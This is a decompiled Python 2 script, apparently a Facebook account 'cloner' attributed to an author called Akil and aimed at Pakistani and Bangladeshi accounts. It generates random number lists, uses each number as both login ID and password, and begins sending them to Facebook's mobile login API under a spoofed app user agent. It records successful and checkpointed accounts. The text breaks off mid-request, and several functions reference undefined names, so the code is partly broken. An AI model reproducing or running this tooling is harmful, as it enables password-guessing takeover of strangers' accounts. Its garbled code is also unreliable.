# uncompyle6 version 3.7.4

# Python bytecode 2.7

# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 

# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/

# Embedded file name: koNtol

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')

for n in range(1000):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

try:

    import requests

except ImportError:

    os.system('pip2 install mechanize')

try:

    import mechanize

except ImportError:

    os.system('pip2 install request')

    time.sleep(1)

    os.system('Then type: python2 QAISER.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'

    x = x.replace('!0', '\x1b[0m')

    sys.stdout.write(x + '\n')

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(3.0 / 200)

def tik():

    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']

    for o in titik:

        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;97mWait Few Minutes \x1b[1;97m' + o,

        sys.stdout.flush()

        time.sleep(0.5)

back = 0

oks = []

id = []

cpb = []

vulnot = '\x1b[31mNot Vuln'

vuln = '\x1b[32mVuln'

os.system('clear')

logo1 = '\n\n      \x1b[0;33mAKIL\n      \x1b[0;35mCloner\n      \x1b[0;33\n       \x1b[101m\x1b[37;1mTAKE DOWN FIGHTERS\x1b[0m\n       \x1b[101m\x1b[37;1m  CREATED BY AKIL  \x1b[0m\n\x1b[1;92m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE   : \x1b[0;31m  https://youtube.com/channel/UC2s3xWCwfWKyvdOc_SYbwrQ \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mTELEGRAM   :  \x1b[0;31m+8801913086161 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;31mhttps://www.facebook.com/hasan.akil.965\n\x1b[1;97m-----------------------------------------------'

def lisensi():

    os.system('clear')

    login()

def login():

    os.system('clear')

    print logo1

    print

    print '\x1b[1;95m(1) Pakistani id Cloning'

    print '\x1b[1;92m(2) Bangladesh Cloning by Akil'

    print '\x1b[1;91m(0) Back'

    pilih_Somi()

def pilih_Somi():

    Somi = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')

    if Somi == '':

        print '\x1b[1;97mFill In Correctly'

        pilih_login()

    elif Somi == '1':

        p()

    elif Somi == '2':

        b()

def p():

    os.system('clear')

    print logo1

    print

    print

    print 'Do you want countinue [y/n]'

    act()

def act():

    somi = raw_input('\n\n \x1b[1;97m  ')

    if somi == '':

        print '[!] Fill in correctly'

        act()

    elif somi == 'y':

        tik()

        os.system('clear')

        print logo1

        print

        print '\x1b[1;94mSELECT YOUR NETWORK CODE'

        print '\x1b[1;96m00,01,02,03,04,05,06,07,08,09'

        print '\x1b[1;94m11,12,13,14,15,16,17,18'

        print '\x1b[1;96m21,22,23,24'

        print '\x1b[1;94m30,31,32,33,34,35,36'

        print '\x1b[1;96m40,41,42,43,44,45,46,47,48,49'

        print

        try:

            c = raw_input('>>> ')

            k = '03'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            somi()

    elif somi == 'n':

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    print 47 * '\x1b[1;93m-'

    xxx = str(len(id))

    jalan('\x1b[1;91m TOTAL IDS NUMBER : ' + xxx)

    jalan('\x1b[1;91m TO STOP THIS PROCESS PRESS Ctrl THEN z')

    print 47 * '\x1b[1;94m-'

    def main(arg):

        global cpb

        global oks

        user = arg

        try:

            os.mkdir('save')

        except OSError:

            pass

        try:

            pass1 = user

            data = br.open('https://b-api.facebook.com/
